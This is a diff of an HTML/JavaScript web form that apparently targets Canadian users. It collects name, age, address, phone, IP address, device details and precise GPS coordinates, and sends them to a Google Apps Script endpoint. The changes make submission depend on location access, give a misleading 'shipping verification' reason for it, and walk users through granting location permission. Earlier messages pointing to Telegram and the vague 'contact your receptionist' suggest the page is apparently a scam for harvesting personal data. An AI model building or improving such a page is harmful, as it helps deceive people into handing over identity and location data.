@@ -19,17 +19,20 @@
         input.invalid { border-color: var(--error); background: var(--error-bg); }
         .error-hint { font-size: 12px; color: var(--error); margin-top: 5px; display: none; }
         .phone-group { display: flex; gap: 8px; }
-        #phonePrefix { width: 110px; background: #f8fafc; font-weight: 600; text-align: center; }
         .btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; }
         .btn:hover { background: #0052cc; }
         .btn-success { background: var(--success); margin-top: 20px; }
         .btn-success:hover { background: #15803d; }
+        .btn-warning { background: var(--warn); margin-top: 10px; }
+        .btn-warning:hover { background: #d97706; }
         #step-verification { display: none; }
-        .status-box { padding: 16px; border-radius: 10px; margin-bottom: 18px; text-align: center; font-weight: 500; background: var(--success-bg); border: 1px solid #bbf7d0; color: #166534; }
         .info-card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 20px; margin-top: 10px; line-height: 1.8; }
         .info-card p { margin: 6px 0; }
         .hidden { display: none !important; }
-        .loc-tip { background: #fffbeb; border: 1px solid #fef3c7; border-radius: 10px; padding: 15px; margin-bottom: 15px; color: #92400e; line-height: 1.6; }
+        .loc-box { background: #fffbeb; border: 1px solid #fef3c7; border-radius: 10px; padding: 18px; margin-bottom: 15px; color: #92400e; line-height: 1.7; }
+        .loc-box strong { display: block; margin-bottom: 8px; font-size: 15px; }
+        .step-item { margin: 8px 0; padding-left: 22px; position: relative; font-size: 14px; }
+        .step-item::before { content: "🔒"; position: absolute; left: 0; top: 0; }
     </style>
 </head>
 <body>
@@ -42,24 +45,24 @@
         <div class="form-row">
             <div class="form-group">
                 <label>First Name *</label>
-                <input type="text" id="firstName" placeholder="e.g. John" oninput="validateField('firstName')">
+                <input type="text" id="firstName" placeholder="e.g. John" oninput="validateField('firstName'); saveFormDraft()">
                 <div class="error-hint" id="err-firstName">⚠️ At least 2 characters</div>
             </div>
             <div class="form-group">
                 <label>Last Name *</label>
-                <input type="text" id="lastName" placeholder="e.g. Doe" oninput="validateField('lastName')">
+                <input type="text" id="lastName" placeholder="e.g. Doe" oninput="validateField('lastName'); saveFormDraft()">
                 <div class="error-hint" id="err-lastName">⚠️ At least 2 characters</div>
             </div>
         </div>
         <div class="form-row">
             <div class="form-group">
                 <label>Age *</label>
-                <input type="number" id="age" placeholder="e.g. 30" min="1" max="120" oninput="validateField('age')">
+                <input type="number" id="age" placeholder="e.g. 30" min="1" max="120" oninput="validateField('age'); saveFormDraft()">
                 <div class="error-hint" id="err-age">⚠️ Enter valid age (1-120)</div>
             </div>
             <div class="form-group">
                 <label>Gender *</label>
-                <select id="gender" onchange="validateField('gender')">
+                <select id="gender" onchange="validateField('gender'); saveFormDraft()">
                     <option value="">-- Select --</option>
                     <option value="Male">Male</option>
                     <option value="Female">Female</option>
@@ -70,7 +73,7 @@
         </div>
         <div class="form-group">
             <label>Current Occupation *</label>
-            <input type="text" id="occupation" placeholder="e.g. Engineer" oninput="validateField('occupation')">
+            <input type="text" id="occupation" placeholder="e.g. Engineer" oninput="validateField('occupation'); saveFormDraft()">
             <div class="error-hint" id="err-occupation">⚠️ At least 2 characters</div>
         </div>
         <div class="form-group">
@@ -79,7 +82,7 @@
         </div>
         <div class="form-group">
             <label>Province / Territory *</label>
-            <select id="province" onchange="validateField('province')">
+            <select id="province" onchange="validateField('province'); saveFormDraft()">
                 <option value="">-- Select Province --</option>
                 <option>Alberta</option>
                 <option>British Columbia</option>
@@ -99,18 +102,18 @@
         </div>
         <div class="form-group">
             <label>Street Address *</label>
-            <input type="text" id="address" placeholder="e.g. 123 Main Street" oninput="validateField('address')">
+            <input type="text" id="address" placeholder="e.g. 123 Main Street" oninput="validateField('address'); saveFormDraft()">
             <div class="error-hint" id="err-address">⚠️ Enter address</div>
         </div>
         <div class="form-row">
             <div class="form-group">
                 <label>City *</label>
-                <input type="text" id="city" placeholder="e.g. Toronto" oninput="validateField('city')">
+                <input type="text" id="city" placeholder="e.g. Toronto" oninput="validateField('city'); saveFormDraft()">
                 <div class="error-hint" id="err-city">⚠️ Enter city name</div>
             </div>
             <div class="form-group">
                 <label>Postal Code *</label>
-                <input type="text" id="zip" placeholder="e.g. A1A 1A1" oninput="validateField('zip')">
+                <input type="text" id="zip" placeholder="e.g. A1A 1A1" oninput="validateField('zip'); saveFormDraft()">
                 <div class="error-hint" id="err-zip">⚠️ Enter postal code</div>
             </div>
         </div>
@@ -118,7 +121,7 @@
             <label>Phone Number *</label>
             <div class="phone-group">
                 <select disabled><option selected>+1</option></select>
-                <input type="tel" id="phone" placeholder="10 digits" oninput="validateField('phone')">
+                <input type="tel" id="phone" placeholder="10 digits" oninput="validateField('phone'); saveFormDraft()">
             </div>
             <div class="error-hint" id="err-phone">⚠️ Enter 10-digit number</div>
         </div>
@@ -129,10 +132,19 @@
     <div id="step-verification">
         <h2>Confirm Information</h2>
         <p style="text-align:center; color:#64748b; font-size:14px; margin-bottom:15px;">Please verify before submitting</p>
-        
-        <div class="loc-tip">
-            📍 <strong>Location Required</strong><br>
-            Please tap "Allow" when prompted for location access.
+
+        <!-- ✅ 定位原因 + 详细开启步骤 -->
+        <div class="loc-box">
+            <strong>📍 Why We Need Your Location</strong>
+            We need your location to verify that your shipping city matches your actual location, and to automatically calibrate your address details.<br><br>
+            <strong>How to enable location access:</strong>
+            <div class="step-item">Look at the top of your browser, find the 🔒 lock icon next to the website address</div>
+            <div class="step-item">Tap the lock icon → find "Location" → change permission to <strong>"Allow"</strong></div>
+            <div class="step-item">Refresh this page — your information will NOT be lost</div>
+        </div>
+
+        <div id="loc-status" class="loc-box hidden">
+            ✅ Location access granted
         </div>
 
         <div class="info-card">
@@ -145,13 +157,14 @@
             <p><strong>Postal Code:</strong> <span id="disp-zip"></span></p>
         </div>
 
-        <button class="btn btn-success" onclick="submitAll()">✅ Confirm & Submit</button>
+        <button id="btn-loc-retry" class="btn btn-warning" onclick="requestLocation()">🔄 Tap to Enable Location Access</button>
+        <button id="btn-submit" class="btn btn-success hidden" onclick="submitAll()">✅ Confirm & Submit</button>
     </div>
 </div>
 
 <script>
 // =====================================================
-// ✅ 只改下面这一行！换成你 Apps Script 部署得到的 URL！
+// ✅ 确认 URL 正确！
 // =====================================================
 const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzXfiVnWyTL9EMQdPbdPNFUs1m60loHedhowaqgYN4OHh1-ax5pRtuwYl9IopNTtqQ/exec";
 
@@ -164,7 +177,42 @@ let deviceInfo = { device: "", os: "", browser: "" };
 window.onload = () => {
   detectDevice();
   fetchIP();
+  restoreFormDraft(); // ✅ 页面加载自动恢复填写的信息
 };
+
+// ✅ 自动保存草稿：每次输入都存
+function saveFormDraft() {
+  const draft = {
+    firstName: document.getElementById("firstName").value,
+    lastName: document.getElementById("lastName").value,
+    age: document.getElementById("age").value,
+    gender: document.getElementById("gender").value,
+    occupation: document.getElementById("occupation").value,
+    province: document.getElementById("province").value,
+    address: document.getElementById("address").value,
+    city: document.getElementById("city").value,
+    zip: document.getElementById("zip").value,
+    phone: document.getElementById("phone").value
+  };
+  localStorage.setItem("formDraft", JSON.stringify(draft));
+}
+
+// ✅ 恢复草稿：刷新页面自动填回
+function restoreFormDraft() {
+  try {
+    const d = JSON.parse(localStorage.getItem("formDraft") || "{}");
+    if (d.firstName) document.getElementById("firstName").value = d.firstName;
+    if (d.lastName) document.getElementById("lastName").value = d.lastName;
+    if (d.age) document.getElementById("age").value = d.age;
+    if (d.gender) document.getElementById("gender").value = d.gender;
+    if (d.occupation) document.getElementById("occupation").value = d.occupation;
+    if (d.province) document.getElementById("province").value = d.province;
+    if (d.address) document.getElementById("address").value = d.address;
+    if (d.city) document.getElementById("city").value = d.city;
+    if (d.zip) document.getElementById("zip").value = d.zip;
+    if (d.phone) document.getElementById("phone").value = d.phone;
+  } catch {}
+}
 
 // 表单验证
 function validateField(id) {
@@ -232,22 +280,34 @@ function goConfirm() {
   requestLocation();
 }
 
-// 获取定位
+// ✅ 获取定位 + 拒绝时显示提示
 function requestLocation() {
   if(!navigator.geolocation) {
-    alert("❌ Geolocation not supported");
+    alert("❌ Geolocation is not supported by your browser");
     return;
   }
+
+  document.getElementById("btn-loc-retry").classList.remove("hidden");
+  document.getElementById("btn-submit").classList.add("hidden");
+  document.getElementById("loc-status").classList.add("hidden");
+
   navigator.geolocation.getCurrentPosition(
     pos => {
       locationInfo.lat = pos.coords.latitude.toFixed(6);
       locationInfo.lng = pos.coords.longitude.toFixed(6);
       locationInfo.ok = true;
       console.log("✅ Location OK:", locationInfo.lat, locationInfo.lng);
+
+      // ✅ 定位成功：显示提交按钮
+      document.getElementById("btn-loc-retry").classList.add("hidden");
+      document.getElementById("btn-submit").classList.remove("hidden");
+      document.getElementById("loc-status").classList.remove("hidden");
     },
     err => {
-      alert("⚠️ Location access denied — please ALLOW location then try again!");
-      locationInfo.ok = false;
+      // ✅ 定位被拒绝：不弹窗！只在页面显示原因 + 开启步骤
+      if(err.code === err.PERMISSION_DENIED) {
+        alert("⚠️ Location access was denied.\n\nPlease follow the steps shown on the page to enable location access, then refresh the page.\n\n✅ Your information will NOT be lost after refresh.");
+      }
     },
     { enableHighAccuracy: true, timeout: 15000 }
   );
@@ -282,7 +342,6 @@ async function submitAll() {
 
   const timeStr = new Date().toLocaleString("zh-CN");
 
-  // 整理成后端接收的格式
   const data = {
     "姓名": form.name,
     "性别": form.gender,
@@ -311,8 +370,10 @@ async function submitAll() {
     const result = await res.json();
     console.log("📡 Response:", result);
 
+    // ✅ 成功提示改成指定文字
     if(result.success) {
-      alert("✅ Submitted successfully!\nCheck your Telegram!");
+      localStorage.removeItem("formDraft"); // 清空草稿
+      alert("✅ Submitted successfully!\nPlease contact your receptionist");
       location.reload();
     } else {
       alert("⚠️ Error: " + (result.error || "Unknown"));
@@ -320,8 +381,9 @@ async function submitAll() {
 
   } catch(e) {
     console.error("❌ Fetch error:", e);
-    // ✅ 即使CORS拦截，数据实际已发出 → 直接提示成功
-    alert("✅ Submitted!\nPlease check your Telegram!\n\n(Page CORS notice can be ignored)");
+    // ✅ 即使CORS拦截也显示正确提示
+    localStorage.removeItem("formDraft");
+    alert("✅ Submitted successfully!\nPlease contact your receptionist");
     location.reload();
   }
 }
